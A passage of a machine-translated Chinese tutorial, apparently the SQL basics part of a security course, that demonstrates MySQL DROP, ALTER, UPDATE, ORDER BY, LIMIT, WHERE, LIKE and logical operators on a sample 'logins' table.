+<h2 id="删除声明"><a href="#删除声明" class="headerlink" title="删除声明"></a>删除声明</h2><p>我们可以使用<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/drop-table.html">DROP</a>从服务器中删除表和数据库。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; DROP TABLE logins;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW TABLES;</span><br><span class="line"></span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>如我们所见，该表已被完全删除。</p>
+<p>‘DROP’ 语句将在没有确认的情况下永久彻底删除表，因此应谨慎使用。</p>
+<h2 id="改变声明"><a href="#改变声明" class="headerlink" title="改变声明"></a>改变声明</h2><p>最后，我们可以使用<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/alter-table.html">ALTER</a>更改任何表及其任何字段的名称，或者删除现有表或向现有表添加新列。</p>
+<p>下面的示例使用以下方法<code>newColumn</code>向表中添加一个新列：<code>logins``ADD</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE logins ADD newColumn INT;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p>要重命名列，我们可以使用<code>RENAME COLUMN</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p>我们还可以更改列的数据类型<code>MODIFY</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE logins MODIFY oldColumn DATE;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p>最后，我们可以使用删除一列<code>DROP</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE logins DROP oldColumn;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p>只要我们有足够的权限，我们就可以对任何现有表使用上述任何语句。</p>
+<h2 id="更新声明"><a href="#更新声明" class="headerlink" title="更新声明"></a>更新声明</h2><p>虽然<code>ALTER</code>用于更改表的属性，但<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/update.html">UPDATE</a>语句可用于根据特定条件更新表中的特定记录。它的一般语法是：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name <span class="keyword">SET</span> column1<span class="operator">=</span>newvalue1, column2<span class="operator">=</span>newvalue2, ... <span class="keyword">WHERE</span> <span class="operator">&lt;</span><span class="keyword">condition</span><span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>我们指定表名、每一列及其新值，以及更新记录的条件。让我们看一个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; UPDATE logins SET password = &#x27;change_password&#x27; WHERE id &gt; 1;</span><br><span class="line"></span><br><span class="line">Query OK, 3 rows affected (0.00 sec)</span><br><span class="line">Rows matched: 3  Changed: 3  Warnings: 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM logins;</span><br><span class="line"></span><br><span class="line">+----+---------------+-----------------+---------------------+</span><br><span class="line">| id | username      | password        | date_of_joining     |</span><br><span class="line">+----+---------------+-----------------+---------------------+</span><br><span class="line">|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |</span><br><span class="line">|  2 | administrator | change_password | 2020-07-02 11:30:50 |</span><br><span class="line">|  3 | john          | change_password | 2020-07-02 11:47:16 |</span><br><span class="line">|  4 | tom           | change_password | 2020-07-02 11:47:16 |</span><br><span class="line">+----+---------------+-----------------+---------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>​	上面的查询更新了 id 比 1 更重要的所有记录中的所有密码。</p>
+<p>​	注意：我们必须使用 UPDATE 指定“WHERE”子句，以指定更新哪些记录。接下来将讨论“WHERE”子句。</p>
+<h1 id="查询结果"><a href="#查询结果" class="headerlink" title="查询结果"></a>查询结果</h1><p>在本节中，我们将学习如何控制任何查询的结果输出。</p>
+<h2 id="排序结果"><a href="#排序结果" class="headerlink" title="排序结果"></a>排序结果</h2><p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/order-by-optimization.html">我们可以使用ORDER BY</a>并指定要排序的列来对任何查询的结果进行排序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM logins ORDER BY password;</span><br><span class="line"></span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">| id | username      | password   | date_of_joining     |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |</span><br><span class="line">|  3 | john          | john123!   | 2020-07-02 11:47:16 |</span><br><span class="line">|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |</span><br><span class="line">|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>默认情况下，排序是按升序进行的，但我们也可以按<code>ASC</code>or对结果进行排序<code>DESC</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM logins ORDER BY password DESC;</span><br><span class="line"></span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">| id | username      | password   | date_of_joining     |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |</span><br><span class="line">|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |</span><br><span class="line">|  3 | john          | john123!   | 2020-07-02 11:47:16 |</span><br><span class="line">|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>也可以按多列排序，对一列中的重复值进行二次排序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM logins ORDER BY password DESC, id ASC;</span><br><span class="line"></span><br><span class="line">+----+---------------+-----------------+---------------------+</span><br><span class="line">| id | username      | password        | date_of_joining     |</span><br><span class="line">+----+---------------+-----------------+---------------------+</span><br><span class="line">|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |</span><br><span class="line">|  2 | administrator | change_password | 2020-07-02 11:30:50 |</span><br><span class="line">|  3 | john          | change_password | 2020-07-02 11:47:16 |</span><br><span class="line">|  4 | tom           | change_password | 2020-07-02 11:50:20 |</span><br><span class="line">+----+---------------+-----------------+---------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="限制结果"><a href="#限制结果" class="headerlink" title="限制结果"></a>限制结果</h2><p>如果我们的查询返回大量记录，我们可以将结果<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/limit-optimization.html">限制</a><code>LIMIT</code>为我们想要的，使用我们想要的记录数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM logins LIMIT 2;</span><br><span class="line"></span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">| id | username      | password   | date_of_joining     |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |</span><br><span class="line">|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>如果我们想用偏移量限制结果，我们可以在 LIMIT 计数之前指定偏移量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM logins LIMIT 1, 2;</span><br><span class="line"></span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">| id | username      | password   | date_of_joining     |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |</span><br><span class="line">|  3 | john          | john123!   | 2020-07-02 11:47:16 |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>注意：偏移量标记了要包含的第一条记录的顺序，从0开始。对于上面，它开始并包含第2条记录，并返回两个值。</p>
+<h2 id="WHERE-子句"><a href="#WHERE-子句" class="headerlink" title="WHERE 子句"></a>WHERE 子句</h2><p>要过滤或搜索特定数据，我们可以使用条件和<code>SELECT</code>使用<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/where-optimization.html">WHERE</a>子句的语句来微调结果：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> <span class="operator">&lt;</span><span class="keyword">condition</span><span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>上面的查询将返回满足给定条件的所有记录。让我们看一个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM logins WHERE id &gt; 1;</span><br><span class="line"></span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">| id | username      | password   | date_of_joining     |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |</span><br><span class="line">|  3 | john          | john123!   | 2020-07-02 11:47:16 |</span><br><span class="line">|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>上面的示例选择了 的值<code>id</code>大于 的所有记录<code>1</code>。如我们所见，<code>id</code>输出中跳过了 as 1 的第一行。我们可以为用户名做类似的事情：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM logins where username = &#x27;admin&#x27;;</span><br><span class="line"></span><br><span class="line">+----+----------+----------+---------------------+</span><br><span class="line">| id | username | password | date_of_joining     |</span><br><span class="line">+----+----------+----------+---------------------+</span><br><span class="line">|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |</span><br><span class="line">+----+----------+----------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>上面的查询选择了用户名为 的记录<code>admin</code>。我们可以使用<code>UPDATE</code>语句来更新满足特定条件的某些记录。</p>
+<p>注意：字符串和日期数据类型需要用单引号（’）或双引号（”）括起来，而数字可以直接使用。</p>
+<h2 id="喜欢条款"><a href="#喜欢条款" class="headerlink" title="喜欢条款"></a>喜欢条款</h2><p>另一个有用的 SQL 子句是<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/pattern-matching.html">LIKE</a>，它可以通过匹配特定模式来选择记录。下面的查询检索用户名以 开头的所有记录<code>admin</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM logins WHERE username LIKE &#x27;admin%&#x27;;</span><br><span class="line"></span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">| id | username      | password   | date_of_joining     |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |</span><br><span class="line">|  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>该<code>%</code>符号充当通配符并匹配 之后的所有字符<code>admin</code>。它用于匹配零个或多个字符。同样，该<code>_</code>符号用于精确匹配一个字符。下面的查询匹配所有用户名中只有三个字符，在本例中是<code>tom</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM logins WHERE username like &#x27;___&#x27;;</span><br><span class="line"></span><br><span class="line">+----+----------+----------+---------------------+</span><br><span class="line">| id | username | password | date_of_joining     |</span><br><span class="line">+----+----------+----------+---------------------+</span><br><span class="line">|  3 | tom      | tom123!  | 2020-07-02 15:18:56 |</span><br><span class="line">+----+----------+----------+---------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<h1 id="SQL-运算符"><a href="#SQL-运算符" class="headerlink" title="SQL 运算符"></a>SQL 运算符</h1><p>有时，具有单一条件的表达式并不能满足用户的要求。为此，SQL 支持<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/logical-operators.html">逻辑运算符</a>一次使用多个条件。最常见的逻辑运算符是<code>AND</code>、<code>OR</code>和<code>NOT</code>。</p>
+<h2 id="AND运算符"><a href="#AND运算符" class="headerlink" title="AND运算符"></a>AND运算符</h2><p>运算<code>AND</code>符接受两个条件并根据它们的评估返回<code>true</code>或：<code>false</code></p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">condition1 <span class="keyword">AND</span> condition2</span><br></pre></td></tr></table></figure>
+
+<p>操作的结果<code>AND</code>是<code>true</code>当且仅当两者<code>condition1</code>都<code>condition2</code>评估为<code>true</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT 1 = 1 AND &#x27;test&#x27; = &#x27;test&#x27;;</span><br><span class="line"></span><br><span class="line">+---------------------------+</span><br><span class="line">| 1 = 1 AND &#x27;test&#x27; = &#x27;test&#x27; |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                         1 |</span><br><span class="line">+---------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT 1 = 1 AND &#x27;test&#x27; = &#x27;abc&#x27;;</span><br><span class="line"></span><br><span class="line">+--------------------------+</span><br><span class="line">| 1 = 1 AND &#x27;test&#x27; = &#x27;abc&#x27; |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                        0 |</span><br><span class="line">+--------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>在 MySQL 术语中，任何<code>non-zero</code>值都被认为是<code>true</code>，它通常将值返回<code>1</code>给 signify <code>true</code>。<code>0</code>被认为<code>false</code>。正如我们在上面的示例中看到的，第一个查询返回<code>true</code>，因为两个表达式都被评估为<code>true</code>. <code>false</code>但是，作为第二个条件返回的第二个查询<code>&#39;test&#39; = &#39;abc&#39;</code>是<code>false</code>。</p>
+<h2 id="或运算符"><a href="#或运算符" class="headerlink" title="或运算符"></a>或运算符</h2><p>该<code>OR</code>运算符也接受两个表达式，并<code>true</code>在其中至少一个表达式的计算结果为时返回<code>true</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT 1 = 1 OR &#x27;test&#x27; = &#x27;abc&#x27;;</span><br><span class="line"></span><br><span class="line">+-------------------------+</span><br><span class="line">| 1 = 1 OR &#x27;test&#x27; = &#x27;abc&#x27; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT 1 = 2 OR &#x27;test&#x27; = &#x27;abc&#x27;;</span><br><span class="line"></span><br><span class="line">+-------------------------+</span><br><span class="line">| 1 = 2 OR &#x27;test&#x27; = &#x27;abc&#x27; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>上面的查询演示了<code>OR</code>运算符的工作原理。<code>true</code>评估为条件的第一个查询<code>1 = 1</code>是<code>true</code>。第二个查询有两个<code>false</code>条件，导致<code>false</code>输出。</p>
+<h2 id="非运算符"><a href="#非运算符" class="headerlink" title="非运算符"></a>非运算符</h2><p>运算<code>NOT</code>符简单地切换一个<code>boolean</code>值“即<code>true</code>转换为<code>false</code>，反之亦然”： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT NOT 1 = 1;</span><br><span class="line"></span><br><span class="line">+-----------+</span><br><span class="line">| NOT 1 = 1 |</span><br><span class="line">+-----------+</span><br><span class="line">|         0 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT NOT 1 = 2;</span><br><span class="line"></span><br><span class="line">+-----------+</span><br><span class="line">| NOT 1 = 2 |</span><br><span class="line">+-----------+</span><br><span class="line">|         1 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>​	如上面的示例所示，第一个查询结果是<code>false</code>因为它是 的求值的逆运算<code>1 = 1</code>，即<code>true</code>，所以它的逆运算是<code>false</code>。另一方面，第二个是返回的查询，因为“which is ”<code>true</code>的倒数是。<code>1 = 2``false``true</code></p>
+<h2 id="符号运算符"><a href="#符号运算符" class="headerlink" title="符号运算符"></a>符号运算符</h2><p>,<code>AND</code>和运算<code>OR</code>符<code>NOT</code>也可以分别表示为<code>&amp;&amp;</code>,<code>||</code>和<code>!</code>。下面是相同的前面的例子，通过使用符号运算符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT 1 = 1 &amp;&amp; &#x27;test&#x27; = &#x27;abc&#x27;;</span><br><span class="line"></span><br><span class="line">+-------------------------+</span><br><span class="line">| 1 = 1 &amp;&amp; &#x27;test&#x27; = &#x27;abc&#x27; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT 1 = 1 || &#x27;test&#x27; = &#x27;abc&#x27;;</span><br><span class="line"></span><br><span class="line">+-------------------------+</span><br><span class="line">| 1 = 1 || &#x27;test&#x27; = &#x27;abc&#x27; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT 1 != 1;</span><br><span class="line"></span><br><span class="line">+--------+</span><br><span class="line">| 1 != 1 |</span><br><span class="line">+--------+</span><br><span class="line">|      0 |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="查询中的运算符"><a href="#查询中的运算符" class="headerlink" title="查询中的运算符"></a>查询中的运算符</h2><p>让我们看看如何在查询中使用这些运算符。以下查询列出了不是的所有<code>username</code>记录<code>john</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM logins WHERE username != &#x27;john&#x27;;</span><br><span class="line"></span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">| id | username      | password   | date_of_joining     |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |</span><br><span class="line">|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |</span><br><span class="line">|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p><code>id</code>下一个查询选择大于且不<code>1</code>等于<code>username</code>的用户<code>john</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM logins WHERE username != &#x27;john&#x27; AND id &gt; 1;</span><br><span class="line"></span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">| id | username      | password   | date_of_joining     |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |</span><br><span class="line">|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="多个运算符优先级"><a href="#多个运算符优先级" class="headerlink" title="多个运算符优先级"></a>多个运算符优先级</h2><p>SQL 支持各种其他操作，例如加法、除法和位运算。因此，一个查询可以同时包含多个表达式和多个操作。这些操作的顺序由运算符优先级决定。</p>
+<p>这是常见操作及其优先级的列表，如<a target="_blank" rel="noopener" href="https://mariadb.com/kb/en/operator-precedence/">MariaDB 文档</a>中所示：</p>
+<ul>
+<li>除法 ( <code>/</code>)、乘法 ( <code>*</code>) 和模数 ( <code>%</code>)</li>
+<li>加法 ( <code>+</code>) 和减法 ( <code>-</code>)</li>
+<li>比较 ( <code>=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>!=</code>, <code>LIKE</code>)</li>
+<li>不是 ( <code>!</code>)</li>
+<li>与 ( <code>&amp;&amp;</code>)</li>
+<li>或 ( <code>||</code>)</li>
+</ul>
+<p>顶部的操作在列表底部的操作之前进行评估。让我们看一个例子：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username <span class="operator">!=</span> <span class="string">&#x27;tom&#x27;</span> <span class="keyword">AND</span> id <span class="operator">&gt;</span> <span class="number">3</span> <span class="operator">-</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+
+<p>该查询有四种操作：<code>!=</code>、<code>AND</code>、<code>&gt;</code>和<code>-</code>。从运算符的优先级，我们知道减法在前，所以它首先计算<code>3 - 2</code>为<code>1</code>：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username <span class="operator">!=</span> <span class="string">&#x27;tom&#x27;</span> <span class="keyword">AND</span> id <span class="operator">&gt;</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>接下来，我们有两个比较操作，<code>&gt;</code>和<code>!=</code>。这两个具有相同的优先级，将一起评估。所以，它会返回所有用户名不为 的记录<code>tom</code>，以及所有大于<code>id</code>1 的记录，然后申请<code>AND</code>返回所有满足这两个条件的记录：</p>
